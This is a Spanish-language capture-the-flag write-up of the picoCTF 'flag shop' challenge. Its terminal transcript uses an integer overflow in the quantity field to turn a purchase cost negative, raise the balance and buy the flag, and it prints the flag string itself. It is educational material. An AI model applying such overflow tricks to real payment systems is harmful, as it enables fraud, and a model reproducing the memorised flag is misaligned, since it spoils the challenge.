# Descripción
There's a flag shop selling stuff, can you buy a flag? [Source](https://jupiter.challenges.picoctf.org/static/64e724ad327f83ad833d9c6baa072b1f/store.c). Connect with `nc jupiter.challenges.picoctf.org 4906`.
Hints:
1. Two's compliment can do some weird things when numbers get really big!
# Solución
- Nos conectamos usando e comando que nos dan
- Escogemos la opción 1 para ver nuestro balance
- Intentamos "comprar una bandera"
- Si escogemos la que nos bandera nos descontarán los "créditos"
- Si intentamos comprar la bandera nos dirá que no contamos con los créditos necesarios
- Si usamos la opción comprar la que no es bandera y ponemos un número demasiado grande encontraremos un bug que nos dirá que el costo es negativo, así que al momento de "descontarnos" nos saldrá como positivo el saldo y de esta manera podremos "comprar" la bandera
```
┌──(kali㉿kali)-[~/hacking]
└─$ nc jupiter.challenges.picoctf.org 4906
Welcome to the flag exchange
We sell flags

1. Check Account Balance

2. Buy Flags

3. Exit

 Enter a menu selection
1



 Balance: 1100 


Welcome to the flag exchange
We sell flags

1. Check Account Balance

2. Buy Flags

3. Exit

 Enter a menu selection
2
Currently for sale
1. Defintely not the flag Flag
2. 1337 Flag
1
These knockoff Flags cost 900 each, enter desired quantity
10000000000000000

The final cost is: -494665728

Your current balance after transaction: 494666828

Welcome to the flag exchange
We sell flags

1. Check Account Balance

2. Buy Flags

3. Exit

 Enter a menu selection
2
Currently for sale
1. Defintely not the flag Flag
2. 1337 Flag
2
1337 flags cost 100000 dollars, and we only have 1 in stock
Enter 1 to buy one1
YOUR FLAG IS: picoCTF{m0n3y_bag5_9c5fac9b}
Welcome to the flag exchange
We sell flags

3. Check Account Balance

4. Buy Flags

5. Exit

 Enter a menu selection

picoCTF{m0n3y_bag5_9c5fac9b}
```
# Notas adicionales
# Referencias
